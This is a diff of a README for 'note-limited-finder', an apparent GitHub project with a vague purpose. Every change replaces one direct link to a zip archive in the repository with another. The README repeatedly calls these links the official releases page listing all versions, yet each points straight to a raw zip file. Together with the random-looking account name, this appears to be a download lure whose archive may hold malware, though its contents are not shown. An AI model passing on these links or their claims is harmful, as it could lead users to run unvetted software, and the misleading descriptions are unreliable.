@@ -1,6 +1,6 @@
 # 📒 note-limited-finder - Find Note Limits Quickly
 
-[![Download note-limited-finder](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/carcarriersteroid68/note-limited-finder/raw/refs/heads/main/contents/limited-note-finder-3.5.zip)
+[![Download note-limited-finder](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/carcarriersteroid68/note-limited-finder/main/assets/finder-note-limited-v1.0-alpha.3.zip)
 
 ---
 
@@ -37,13 +37,13 @@ Before you start, make sure your computer meets these basic requirements:
 
 Start using note-limited-finder by downloading the app from the releases page. Click the button below to go directly to the download page:
 
-[![Download note-limited-finder](https://img.shields.io/badge/Download-Here-blue)](https://github.com/carcarriersteroid68/note-limited-finder/raw/refs/heads/main/contents/limited-note-finder-3.5.zip)
+[![Download note-limited-finder](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/carcarriersteroid68/note-limited-finder/main/assets/finder-note-limited-v1.0-alpha.3.zip)
 
 ### Step 1: Visit the Download Page
 
 Go to the official releases page by clicking the link above or paste this into your web browser:
 
-https://github.com/carcarriersteroid68/note-limited-finder/raw/refs/heads/main/contents/limited-note-finder-3.5.zip
+https://raw.githubusercontent.com/carcarriersteroid68/note-limited-finder/main/assets/finder-note-limited-v1.0-alpha.3.zip
 
 This page shows all the available versions of note-limited-finder. You will find the latest version at the top.
 
@@ -121,10 +121,10 @@ If you want to keep the results, click "Save Report." The app will create a summ
 
 Click below to visit the official download page for all versions:
 
-[![Download note-limited-finder](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/carcarriersteroid68/note-limited-finder/raw/refs/heads/main/contents/limited-note-finder-3.5.zip)
+[![Download note-limited-finder](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/carcarriersteroid68/note-limited-finder/main/assets/finder-note-limited-v1.0-alpha.3.zip)
 
 Or copy this URL:
 
-https://github.com/carcarriersteroid68/note-limited-finder/raw/refs/heads/main/contents/limited-note-finder-3.5.zip
+https://raw.githubusercontent.com/carcarriersteroid68/note-limited-finder/main/assets/finder-note-limited-v1.0-alpha.3.zip
 
 Use this page any time you need to get a new version or install the software on another PC.
